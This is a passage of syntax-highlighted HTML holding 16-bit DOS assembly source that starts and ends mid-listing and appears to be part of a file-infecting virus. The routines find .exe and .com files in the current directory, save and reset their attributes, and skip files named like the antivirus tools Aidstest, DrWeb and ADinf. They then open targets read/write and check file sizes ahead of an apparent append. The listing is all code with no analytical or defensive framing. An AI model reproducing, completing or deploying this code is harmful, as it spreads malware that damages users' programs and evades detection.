   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0000000000100111b</span><span class="sc0"> </span><span class="sc1">;atr</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">
   </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@error1</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">CurDTA</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">and</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01fh</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0"> </span><span class="sc1">;if 52 then ---</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@next_f</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Test_Name</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@next_f</span><span class="sc0">
</span><span class="sc5">N_Lin</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">CurDTA</span><span class="sc4">+</span><span class="sc2">30</span><span class="sc0">
</span><span class="sc5">N_C</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@end_str</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">FileNs</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">N_C</span><span class="sc0">
</span><span class="sc5">@end_str</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">FileNs</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">INCREM</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">CurDTA</span><span class="sc4">+</span><span class="sc2">15H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">FileNs</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">;SAVE OLD ART</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">FileNs</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">SET_ART_SPESH</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">count_f</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@to_exit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">INCREM</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@Fndnext</span><span class="sc0">
        </span><span class="sc1">;- errors ---</span><span class="sc0">
</span><span class="sc5">@error1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;--*.exe or *.com in cur dir not exist</span><span class="sc0">
</span><span class="sc5">@error2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;-- 5 exe in cur dir not exist</span><span class="sc0">
</span><span class="sc5">mem_error</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@to_exit</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Set_DTA</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----Fnd2stfile-----</span><span class="sc0">
</span><span class="sc5">@next_f</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@Fndnext</span><span class="sc0">
</span><span class="sc5">@Fndnext2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">@Fndnext</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">
          </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@error2</span><span class="sc0">
        </span><span class="sc1">;--if 52 s</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">CurDTA</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@Fndnext</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Test_Name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">   </span><span class="sc5">@Fndnext2</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">N_Lin</span><span class="sc0">
</span><span class="sc5">@to_exit</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">oldDTA</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">oldDTA</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Set_DTA</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Test_Name</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">               </span><span class="sc1">;тест  на  win?????.???</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">               </span><span class="sc1">;          aid?????.???</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">               </span><span class="sc1">;          drw?????.???</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">               </span><span class="sc1">;          adi?????.???</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">qqqqq</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WINAIDDRWADI'</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">qqqqq</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">test_next</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">CurDTA</span><span class="sc4">+</span><span class="sc2">30</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
     </span><span class="sc5">repp</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@lll01</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc5">@lll01</span><span class="sc4">:</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">repp</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">stop_</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ex</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">test_next</span><span class="sc0">
</span><span class="sc5">stop_</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
    </span><span class="sc5">ex</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">end_find</span><span class="sc4">:</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------</span><span class="sc0">
</span><span class="sc5">OPENF</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;begin1 open file</span><span class="sc0">
</span><span class="sc1">; AH=3dH</span><span class="sc0">
</span><span class="sc1">; DS:DX fname</span><span class="sc0">
</span><span class="sc1">; AL=open mode 2 R/W</span><span class="sc0">
</span><span class="sc1">; out :</span><span class="sc0">
</span><span class="sc1">; AX=error or handle</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3DH</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">
 </span><span class="sc1">;int DOSINT</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc10">error</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc10">error</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;_______ end of open file ____________________</span><span class="sc0">
</span><span class="sc5">closeF</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;close files</span><span class="sc0">
</span><span class="sc1">; AH=3eH</span><span class="sc0">
</span><span class="sc1">; BX handel</span><span class="sc0">
</span><span class="sc1">; out :</span><span class="sc0">
</span><span class="sc1">; AX=error</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3EH</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">
</span><span class="sc1">; int DOSINT</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">error1</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">error1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
</span><span class="sc5">next1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------</span><span class="sc0">
</span><span class="sc5">readf</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;bx=handel</span><span class="sc0">
       </span><span class="sc1">;CX=number of byte to read</span><span class="sc0">
       </span><span class="sc1">;DS:DX BUFFER</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">@error</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
</span><span class="sc5">@next</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;------------ END reading files----------------------</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">writef</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;BX=handel</span><span class="sc0">
        </span><span class="sc1">;CX=number of byte to read</span><span class="sc0">
        </span><span class="sc1">;DS:DX BUFFER</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@er</span><span class="sc0">
       </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">@er</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
</span><span class="sc5">@next_</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;------------ END Writing files----------------------</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------</span><span class="sc0">
</span><span class="sc5">seekf</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; AL=SUBFUN</span><span class="sc0">
       </span><span class="sc1">; BX=handle</span><span class="sc0">
       </span><span class="sc1">; CX:DX distance</span><span class="sc0">
       </span><span class="sc1">; OUT : DX:AX  distance</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">@@error</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">@@error</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
</span><span class="sc5">@@next</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;------------ END seeking files----------------------</span><span class="sc0">
</span><span class="sc1">;________ procedure shr dd___________________________</span><span class="sc0">
</span><span class="sc1">;paramestrs AX=LoDD,DX=HiDD,CX=count bits</span><span class="sc0">
</span><span class="sc1">; reterns   ddWORD(DX,AX)</span><span class="sc0">
</span><span class="sc5">shrDD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0adh</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0d0h</span><span class="sc0">
       </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;________ procedure shl dd___________________________</span><span class="sc0">
</span><span class="sc1">;paramestrs AX=LoDD,DX=HiDD,CX=count bits</span><span class="sc0">
</span><span class="sc1">; reterns   ddWORD(DX,AX)</span><span class="sc0">
</span><span class="sc5">shlDD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0a5h</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c2h</span><span class="sc0">
       </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------</span><span class="sc0">
</span><span class="sc5">FileOpen</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">;begin1 open file</span><span class="sc0">
                   </span><span class="sc1">; DS:DX fname</span><span class="sc0">
                   </span><span class="sc1">; out :</span><span class="sc0">
                   </span><span class="sc1">; AX=error or handle</span><span class="sc0">
                   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">INCREM</span><span class="sc0">
                   </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">FileNs</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPENF</span><span class="sc0">
                   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
                   </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@_error</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">HANDLER</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; save</span><span class="sc0">
                   </span><span class="sc1">; AL=SUBFUN   seekf</span><span class="sc0">
                   </span><span class="sc1">; BX=handle</span><span class="sc0">
                   </span><span class="sc1">; DX:CX distance</span><span class="sc0">
                   </span><span class="sc1">; OUT : DX:AX  distance</span><span class="sc0">
                   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seekf</span><span class="sc0">
                   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
                   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@_error</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">;save file size</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
                  </span><span class="sc6">STC</span><span class="sc0">
                  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">60000</span><span class="sc0">
                  </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">@e</span><span class="sc0">
                  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                  </span><span class="sc6">ret</span><span class="sc0">
              </span><span class="sc5">@e</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc0">
                  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@_error</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">066h</span><span class="sc0">
                  </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------</span><span class="sc0">
